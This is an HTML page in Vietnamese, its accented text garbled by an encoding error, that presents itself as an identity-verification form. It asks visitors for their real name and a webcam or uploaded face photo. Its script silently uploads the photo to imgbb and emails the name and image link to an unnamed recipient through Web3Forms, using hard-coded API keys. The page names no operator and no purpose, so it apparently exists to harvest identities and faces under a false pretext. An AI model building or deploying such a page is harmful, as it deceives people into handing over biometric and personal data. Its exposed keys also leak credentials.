<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>X√°c minh t√™n & ·∫£nh</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background: linear-gradient(270deg,#ff7a7a,#ffb36b,#fff38a,#9be89b,#7fb6ff,#b58bff);
      background-size: 1400% 1400%;
      animation: bg 18s linear infinite;
    }
    @keyframes bg {
      0%{background-position:0% 50%}
      50%{background-position:100% 50%}
      100%{background-position:0% 50%}
    }
    .card {
      width: 380px;
      background: #fff;
      padding: 22px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,.12);
      text-align: center;
    }
    input[type="text"], input[type="file"] {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 2px solid #ddd;
      font-size: 15px;
      box-sizing: border-box;
      margin-top: 8px;
    }
    video, canvas, img {
      width: 100%;
      border-radius: 8px;
      margin-top: 10px;
    }
    button {
      margin-top: 12px;
      padding: 10px 14px;
      border-radius: 8px;
      border: none;
      background: #1976d2;
      color: white;
      font-size: 15px;
      cursor: pointer;
    }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    .msg { margin-top: 10px; font-size: 14px; }
    .err { color: #b00020; }
    .ok { color: #0b8043; font-weight: 600; }
    #preview { display: none; }
  </style>
</head>
<body>
  <div class="card">
    <h2>X√°c minh danh t√≠nh</h2>
    <p>Vui l√≤ng nh·∫≠p t√™n th·∫≠t v√† ch·ª•p ho·∫∑c t·∫£i ·∫£nh khu√¥n m·∫∑t ƒë·ªÉ x√°c th·ª±c.</p>

    <input id="nameInput" type="text" placeholder="Nh·∫≠p t√™n th·∫≠t c·ªßa b·∫°n" />
    <div id="msg" class="msg"></div>

    <button id="openCam">üì∏ M·ªü camera</button>
    <p>ho·∫∑c</p>
    <input id="fileInput" type="file" accept="image/*" />

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <img id="preview" alt="·∫¢nh ƒë√£ ch·ª•p"/>

    <div id="confirmBtns" style="display:none;">
      <button id="captureBtn">Ch·ª•p ·∫£nh</button>
      <button id="retakeBtn" style="display:none;">Ch·ª•p l·∫°i</button>
      <button id="sendBtn" style="display:none;">G·ª≠i</button>
    </div>
  </div>

  <script>
  const WEB3FORMS_KEY = "89379a11-0561-41ee-80a0-bfce9dd60eb7";
  const IMGBB_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0";

  const nameInput = document.getElementById('nameInput');
  const msg = document.getElementById('msg');
  const openCamBtn = document.getElementById('openCam');
  const fileInput = document.getElementById('fileInput');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const preview = document.getElementById('preview');
  const captureBtn = document.getElementById('captureBtn');
  const retakeBtn = document.getElementById('retakeBtn');
  const sendBtn = document.getElementById('sendBtn');
  const confirmBtns = document.getElementById('confirmBtns');

  let stream = null;
  let capturedImage = null;

  function isValidName(name) {
    return /^[A-Za-z√Ä-·ªπ\s]+$/.test(name.trim()) && name.trim().length >= 3;
  }

  function showError(text) {
    msg.textContent = "‚ùå " + text;
    msg.className = "msg err";
  }

  function showOK(text) {
    msg.textContent = "‚úÖ " + text;
    msg.className = "msg ok";
  }

  // m·ªü camera
  openCamBtn.onclick = async () => {
    const name = nameInput.value.trim();
    if (!isValidName(name)) {
      showError("Vui l√≤ng nh·∫≠p t√™n th·∫≠t tr∆∞·ªõc khi m·ªü camera.");
      return;
    }
    msg.textContent = "";
    confirmBtns.style.display = "block";

    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      video.style.display = "block";
      openCamBtn.style.display = "none";
      captureBtn.style.display = "inline-block";
    } catch (err) {
      showError("Kh√¥ng th·ªÉ m·ªü camera. H√£y cho ph√©p truy c·∫≠p camera.");
    }
  };

  // ch·ª•p ·∫£nh
  captureBtn.onclick = () => {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    capturedImage = canvas.toDataURL('image/png');
    preview.src = capturedImage;
    preview.style.display = "block";
    video.style.display = "none";
    captureBtn.style.display = "none";
    retakeBtn.style.display = "inline-block";
    sendBtn.style.display = "inline-block";
  };

  // ch·ª•p l·∫°i
  retakeBtn.onclick = () => {
    preview.style.display = "none";
    video.style.display = "block";
    captureBtn.style.display = "inline-block";
    retakeBtn.style.display = "none";
    sendBtn.style.display = "none";
  };

  // n·∫øu t·∫£i ·∫£nh t·ª´ m√°y
  fileInput.onchange = () => {
    const file = fileInput.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = e => {
        capturedImage = e.target.result;
        preview.src = capturedImage;
        preview.style.display = "block";
        confirmBtns.style.display = "block";
        captureBtn.style.display = "none";
        retakeBtn.style.display = "none";
        sendBtn.style.display = "inline-block";
        if (stream) stream.getTracks().forEach(t => t.stop());
      };
      reader.readAsDataURL(file);
    }
  };

  // g·ª≠i d·ªØ li·ªáu
  sendBtn.onclick = async () => {
    const name = nameInput.value.trim();
    if (!isValidName(name)) {
      showError("T√™n kh√¥ng h·ª£p l·ªá.");
      return;
    }
    if (!capturedImage) {
      showError("B·∫°n ch∆∞a ch·ª•p ho·∫∑c t·∫£i ·∫£nh.");
      return;
    }

    msg.textContent = "‚è≥ ƒêang t·∫£i ·∫£nh...";
    msg.className = "msg";

    try {
      // B1: Upload ·∫£nh l√™n Imgbb
      const formData = new FormData();
      formData.append("image", capturedImage.split(",")[1]); 
      const resImg = await fetch("https://api.imgbb.com/1/upload?key=" + IMGBB_KEY, {
        method: "POST",
        body: formData
      });
      const resultImg = await resImg.json();
      if (!resultImg.success) throw new Error("Upload ·∫£nh th·∫•t b·∫°i");

      const imageUrl = resultImg.data.url;

      // B2: G·ª≠i th√¥ng tin qua Web3Forms
      msg.textContent = "üì® ƒêang g·ª≠i email...";
      const data = {
        access_key: WEB3FORMS_KEY,
        subject: "D·ªØ li·ªáu m·ªõi t·ª´ ng∆∞·ªùi d√πng",
        name: name,
        message: `T√™n: ${name}\n·∫¢nh: ${imageUrl}`
      };

      const res = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      const result = await res.json();

      if (result.success) {
        showOK("‚úÖ G·ª≠i th√†nh c√¥ng!");
        nameInput.value = "";
        preview.style.display = "none";
        confirmBtns.style.display = "none";
        if (stream) stream.getTracks().forEach(t => t.stop());
      } else {
        showError("‚ùå G·ª≠i th·∫•t b·∫°i: " + result.message);
      }
    } catch (err) {
      showError("‚ö†Ô∏è L·ªói: " + err.message);
    }
  };
  </script>
</body>
</html>
